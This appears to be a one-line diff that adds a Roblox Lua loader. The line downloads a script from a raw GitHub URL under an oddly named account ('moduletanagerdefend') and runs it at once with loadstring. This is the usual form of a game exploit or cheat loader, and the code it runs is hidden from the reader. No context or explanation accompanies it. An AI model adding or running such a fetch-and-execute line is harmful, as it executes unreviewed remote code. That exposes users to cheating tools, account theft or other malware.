@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/interrogation-new-cases-spam2-2iazzusxo547nv.lua"))()
